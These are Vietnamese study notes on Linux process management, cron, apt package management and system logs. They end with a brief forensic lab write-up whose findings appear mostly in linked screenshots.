Lệnh `ps` để cung cấp danh sách các tiến trình đang chạy trong phiên người dùng của mình và một số thông tin bổ sung như mã trạng thái, phiên đang chạy, thời gian sử dụng CPU và tên của chương trình hoặc lệnh thực tế đang được thực thi
Để xem các tiến trình do người dùng khác chạy và những tiến trình không chạy từ một phiên (tức là các tiến trình hệ thống) dùng `ps aux`
Lệnh `top` cung cấp số liệu thống kê thời gian thực về các tiến trình đang chạy trên hệ thống thay vì chỉ xem một lần. Các số liệu thống kê này sẽ được cập nhật mỗi 10 giây
Lệnh `kill PID` để chấm dứt process đó
một số tín hiệu mà có thể gửi đến một tiến trình khi nó bị kết thúc:
- `SIGTERM`: Kết thúc tiến trình, nhưng cho phép nó thực hiện một số tác vụ dọn dẹp trước đó
- `SIGKILL`: Kết thúc tiến trình  không thực hiện bất kỳ việc dọn dẹp nào sau đó
- `SIGSTOP`: Dừng/tạm dừng một tiến trình

Hệ điều hành (OS) sử dụng không gian tên (namespaces) để phân chia tài nguyên có sẵn trên máy tính cho các tiến trình (như CPU, RAM và độ ưu tiên)
Lệnh `systemctl` cho phép tương tác với tiến trình
`systemctl [Option][service]`
Ví dụ: để khởi động Apache, sử dụng `systemctl start apache2`
Có 4 option với systemctl: 
- Start
- Stop
- Enable
- Disable

Các tiến trình có thể chạy ở hai trạng thái: background và foreground. Khi tiến trình của được đưa vào chế độ background bằng tổ hợp phím `Ctrl + Z` hoặc toán tử `&`, có thể sử dụng lệnh `fg` để đưa nó trở lại trạng thái hoạt động. Lệnh `fg` được sử dụng để đưa tiến trình background trở lại hoạt động trên cửa sổ terminal, nơi mà kết quả đầu ra của tập lệnh được trả về.

![image](https://hackmd.io/_uploads/ByJxYHOIbg.png)
![image](https://hackmd.io/_uploads/S1TXtr_Ube.png)
![image](https://hackmd.io/_uploads/BkccKHdUbe.png)
![image](https://hackmd.io/_uploads/B1GhKBOI-l.png)
![image](https://hackmd.io/_uploads/HkfJ9B_IZg.png)
![image](https://hackmd.io/_uploads/ryrzqSOIZe.png)
![image](https://hackmd.io/_uploads/Sk7QqHOU-x.png)

## Task 6: Maintaining Your System: Automation
Crontab là một trong những tiến trình được khởi chạy trong quá trình khởi động, chịu trách nhiệm tạo điều kiện và quản lý các tác vụ cron. Crontab đơn giản là một tệp đặc biệt có định dạng được tiến trình cron nhận biết để thực thi từng dòng một. Crontab yêu cầu:

![image](https://hackmd.io/_uploads/rkmcqHdIbx.png)
Lệnh `crontab -e` cho phép chỉnh sửa crontab.

![image](https://hackmd.io/_uploads/rJtpjr_UWe.png)

sử dụng `crontab -e` và thu được 

![image](https://hackmd.io/_uploads/ryw1hruIZe.png)

## Task 7: Maintaining Your System: Package Management
Khi các nhà phát triển muốn đóng góp phần mềm cho cộng đồng, họ sẽ gửi nó đến kho lưu trữ "apt". Nếu được chấp thuận, các chương trình và công cụ của họ sẽ được phát hành rộng rãi. Có thể thêm các kho lưu trữ bổ sung bằng cách sử dụng lệnh `add-apt-repository` hoặc bằng cách liệt kê nhà cung cấp khác
Lệnh `apt` dùng để cài đặt phần mềm vào hệ thống Ubuntu. Lệnh `apt` là một phần của phần mềm quản lý gói cũng có tên là apt. Apt chứa một bộ công cụ hoàn chỉnh cho phép chúng ta quản lý các gói và nguồn phần mềm, cũng như cài đặt hoặc gỡ bỏ phần mềm cùng một lúc.
có thể cài đặt phần mềm thông qua các trình cài đặt gói như `dpkg`
## Task 8: Maintaining Your System: Logs
Nằm trong thư mục **/var/log**, các tập tin và thư mục này chứa thông tin log cho các ứng dụng và dịch vụ đang chạy trên hệ thống.

![image](https://hackmd.io/_uploads/SJq0aH_LZx.png)
Ví dụ: 
- Máy chủ web Apache2
- log fail2ban, được sử dụng để giám sát các nỗ lực tấn công brute force
- UFW được sử dụng làm tường lửa

2 loại log cần quan tâm: **access log** và **error log**

![image](https://hackmd.io/_uploads/SJUHyIuIWe.png)

![image](https://hackmd.io/_uploads/r1y6k8_8-l.png)
![image](https://hackmd.io/_uploads/B1DAJ8_8-l.png)

![image](https://hackmd.io/_uploads/ByQZl8d8be.png)

![image](https://hackmd.io/_uploads/ByBJxUuU-g.png)

# Insider Lab 
![image](https://hackmd.io/_uploads/rJI8XIdIbx.png)
em vào phần boot thì em thấy nó sử dụng distribution là kali 
![image](https://hackmd.io/_uploads/HJTFXLOUZe.png)

![image](https://hackmd.io/_uploads/BkPa4IdLbe.png)
em sẽ export hash list ra 
![image](https://hackmd.io/_uploads/r1-NELOI-g.png)
và thu được 
![image](https://hackmd.io/_uploads/rJ8jV8dLbe.png)

![image](https://hackmd.io/_uploads/S1n4rIOUbe.png)
em check trong phần Downloads và thu được 
![image](https://hackmd.io/_uploads/SJJWB8d8Wx.png)

![image](https://hackmd.io/_uploads/rJbKLUOLbg.png)
em check trong bash_history thì thu được
![image](https://hackmd.io/_uploads/H1A8UI_LWx.png)

![image](https://hackmd.io/_uploads/ryopIL_UWx.png)
![image](https://hackmd.io/_uploads/BJfpIUOU-l.png)

![image](https://hackmd.io/_uploads/BkQWPIu8Zg.png)
![image](https://hackmd.io/_uploads/ByjgD8_LWg.png)


![image](https://hackmd.io/_uploads/SJdQPL_8-g.png)

vì em thấy trong đây size của các file log đều là 0 nên em nghĩ nó ch được chạy

![image](https://hackmd.io/_uploads/rk94D8uUWl.png)

![image](https://hackmd.io/_uploads/BJcW_UOLZg.png)

Trong folder root thì em có tìm được 1 file ảnh có liên quan

![image](https://hackmd.io/_uploads/rJHg_IOLbg.png)

![image](https://hackmd.io/_uploads/B1vDuI_U-l.png)

em theo câu hỏi và đi đến thư mục Documents thì thu được 

![image](https://hackmd.io/_uploads/Hk4Y_UuIbx.png)

![image](https://hackmd.io/_uploads/By5jKUuLbg.png)

em check trong phần auth.log vào 11:26 thì thu được 

![image](https://hackmd.io/_uploads/H1U0FUuIWg.png)

![image](https://hackmd.io/_uploads/HJZd98_Lbx.png)

em check trong phần bash_history check trong từng lệnh cd thì em suy ra được đáp án

![image](https://hackmd.io/_uploads/SJ2ccLOIbx.png)

